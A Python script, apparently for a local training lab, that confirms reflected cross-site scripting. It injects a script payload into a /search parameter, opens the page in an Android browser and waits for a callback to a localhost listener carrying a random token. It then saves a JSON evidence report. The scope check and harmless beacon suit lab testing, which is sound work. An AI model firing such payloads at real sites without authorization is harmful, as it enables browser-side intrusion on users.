import json
import secrets
import shutil
import subprocess
import threading
import urllib.request
import urllib.parse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from datetime import datetime, timezone

BASE = "http://127.0.0.1:18766"

# Verify that we're testing our own training lab
try:
    with urllib.request.urlopen(
        BASE + "/health", timeout=5
    ) as response:
        health = json.load(response)

    if health.get("scope") != "localhost training lab":
        raise ValueError("Unexpected application")

    mode = health["mode"]
except Exception as error:
    raise SystemExit(f"Training lab unavailable: {error}")

token = secrets.token_urlsafe(16)
received = threading.Event()

class ProofHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urllib.parse.urlsplit(self.path)
        params = urllib.parse.parse_qs(parsed.query)

        if (
            parsed.path == "/proof"
            and params.get("token") == [token]
        ):
            received.set()
            self.send_response(204)
            self.end_headers()
        else:
            self.send_error(404)

    def log_message(self, *args):
        pass

# Choose an available local port automatically
server = ThreadingHTTPServer(
    ("127.0.0.1", 0),
    ProofHandler
)

port = server.server_address[1]

threading.Thread(
    target=server.serve_forever,
    daemon=True
).start()

# JavaScript runs only if the browser executes it
payload = (
    "<script>"
    "window.__xssLabProof=new Image();"
    "window.__xssLabProof.src="
    f"'http://127.0.0.1:{port}/proof?token={token}';"
    "</script>"
)

target = BASE + "/search?" + urllib.parse.urlencode({
    "q": payload
})

print("\n=== REAL JAVASCRIPT XSS VERIFICATION ===")
print("Lab mode:", mode)

# Check the raw response first
try:
    with urllib.request.urlopen(
        target, timeout=8
    ) as response:
        body = response.read().decode(
            "utf-8", errors="replace"
        )
    unescaped = payload in body
except Exception as error:
    server.shutdown()
    raise SystemExit(f"Request failed: {error}")

print("Unescaped script:", unescaped)
print("\nOpening test in Android browser...")

if shutil.which("termux-open-url"):
    try:
        subprocess.run(
            ["termux-open-url", target],
            check=True,
            timeout=10
        )
    except Exception as error:
        print("Automatic browser launch failed:", error)
        print("Open this URL manually:", target)
else:
    print("Open this URL in Chrome:", target)

print("\nWaiting for JavaScript proof...")

# Give Chrome time to load and execute the page
timeout = 60 if unescaped else 20

try:
    confirmed = received.wait(timeout)
finally:
    server.shutdown()
    server.server_close()

if confirmed:
    result = "CONFIRMED: JavaScript executed in browser"
elif not unescaped:
    result = "NOT OBSERVED: Script escaped in response"
else:
    result = "INCONCLUSIVE: No browser callback received"

print("\n=== RESULT ===")
print(result)

report = {
    "target": BASE,
    "lab_mode": mode,
    "timestamp": datetime.now(
        timezone.utc
    ).isoformat(),
    "unescaped_script": unescaped,
    "javascript_execution_confirmed": confirmed,
    "result": result
}

Path("reports").mkdir(exist_ok=True)

filename = Path("reports") / (
    "js-xss-proof-"
    + mode + "-"
    + datetime.now().strftime("%Y%m%d-%H%M%S")
    + ".json"
)

filename.write_text(
    json.dumps(report, indent=2),
    encoding="utf-8"
)

print("Evidence saved:", filename)
